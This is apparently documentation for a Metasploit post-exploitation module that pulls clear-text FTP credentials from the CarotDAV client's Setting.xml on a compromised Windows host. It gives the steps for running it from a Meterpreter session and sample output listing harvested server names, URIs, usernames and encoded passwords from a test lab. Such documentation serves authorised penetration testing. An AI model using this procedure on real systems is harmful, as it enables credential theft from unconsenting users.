## Vulnerable Application

This post-exploitation module extracts clear text credentials from the CarotDAV ftp Client.

The CarotDAV FTP Client is avaialble from (https://rei.to/carotdav_en.html).

This module extracts information from the Setting file in the "AppData\Roaming\Rei Software\CarotDAV" directory.

This module extracts server information such as connection name, target URI, username and password.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/carotdav_ftp
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files
which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined
regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Scenarios
### CarotDAV FTP v1.16.3 on Microsoft Windows 10 Home 10.0.19045 N/A Build 19045 - Default Output
```
msf6 post(windows/gather/credentials/carotdav_ftp) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Carotdav's Setting file found
[*] Downloading C:\Users\test\AppData\Roaming\Rei Software\CarotDAV\Setting.xml
[*] Carotdav Setting.xml downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508103946_default_10.0.0.2_CarotDAVSetting._341142.xml

[+] <Name>TheTestBed</Name>
[+] <Name>Aperture Testing Laboratories</Name>
[+] <TargetUri>ftp://10.0.0.2/</TargetUri>
[+] <TargetUri>ftp://10.0.0.3/</TargetUri>
[+] <UserName>TestBed\TheTester</UserName>
[+] <UserName>TestBed\TheBackupTester</UserName>
[+] <Password>dABpAGEAcwBwAGIAaQBxAGUAMgByAA==</Password>
[+] <Password>dABpAGEAcwBwAGIAaQBxAGUAMgByAA==</Password>
[+] File with data saved:  /home/kali/.msf4/loot/20240508103947_default_10.0.0.2_EXTRACTIONSSetti_673514.xml
[*] PackRat credential sweep Completed
[*] Post module execution completed

```

### CarotDAV FTP v1.16.3 on Microsoft Windows 10 Home 10.0.19045 N/A Build 19045 - Verbose Output
```
msf6 post(windows/gather/credentials/carotdav_ftp) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Starting Packrat...
[-] Carotdav's base folder not found in users's user directory

[*] Starting Packrat...
[*] Carotdav's base folder found
[*] Found the folder containing specified artifact for Setting.
[*] Carotdav's Setting file found
[*] Processing C:\Users\test\AppData\Roaming\Rei Software\CarotDAV
[*] Downloading C:\Users\test\AppData\Roaming\Rei Software\CarotDAV\Setting.xml
[*] Carotdav Setting.xml downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508103903_default_10.0.0.2_CarotDAVSetting._292914.xml

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <Name>TheTestBed</Name>
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <Name>Aperture Testing Laboratories</Name>
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <TargetUri>ftp://10.0.0.2/</TargetUri>
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <TargetUri>ftp://10.0.0.3/</TargetUri>
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <UserName>TestBed\TheTester</UserName>
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <UserName>TestBed\TheBackupTester</UserName>
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <Password>dABpAGEAcwBwAGIAaQBxAGUAMgByAA==</Password>
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <Password>dABpAGEAcwBwAGIAaQBxAGUAMgByAA==</Password>
[+] File with data saved:  /home/kali/.msf4/loot/20240508103903_default_10.0.0.2_EXTRACTIONSSetti_754664.xml
[*] PackRat credential sweep Completed
[*] Post module execution completed

```
